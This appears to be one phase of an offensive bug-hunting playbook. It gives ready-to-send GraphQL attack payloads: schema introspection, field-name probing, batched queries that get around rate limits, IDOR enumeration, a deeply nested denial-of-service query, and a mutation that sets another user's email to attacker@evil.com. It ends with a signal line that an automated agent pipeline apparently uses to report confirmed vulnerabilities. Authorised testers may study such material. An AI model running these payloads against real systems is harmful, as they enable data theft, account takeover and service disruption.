# ZDH Phase 17: GraphQL Attack Vectors

## Phase 17 - GraphQL Attack Vectors

```bash
# 1. Introspection (reveals entire API schema)
curl -s "https://<target>/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query": "{__schema{queryType{name}mutationType{name}types{name kind fields{name type{name kind ofType{name kind}}}}}}"}'
# If returns full schema -> enumerate all queries/mutations

# 2. Find GraphQL endpoint if not obvious
/graphql, /graphiql, /api/graphql, /query, /gql, /v1/graphql

# 3. Field suggestion attack (even if introspection disabled)
{"query": "{user{emial}}"}  # typo
# Returns: "Did you mean 'email'?" -> field name confirmed despite no introspection

# 4. Batch query abuse (rate limit bypass)
[{"query": "{user(id:1){email}}"}, {"query": "{user(id:2){email}}"}, ...]
# Send 100 queries in one HTTP request -> bypass per-request rate limits

# 5. IDOR via GraphQL ID
{"query": "{order(id: \"ORDER_123\"){items total userEmail}}"}  # try other IDs

# 6. Nested query DoS
{"query": "{users{friends{friends{friends{friends{friends{email}}}}}}}"}  # deep nesting

# 7. Mutation IDOR
{"mutation": "updateUser(id: \"OTHER_USER_ID\", email: \"attacker@evil.com\") {success}"}
```

**Signal:** `emit_signal VULN_CONFIRMED "GraphQL IDOR: <query/mutation> exposes <data-type>" "main/zerodayhunt" 0.89`
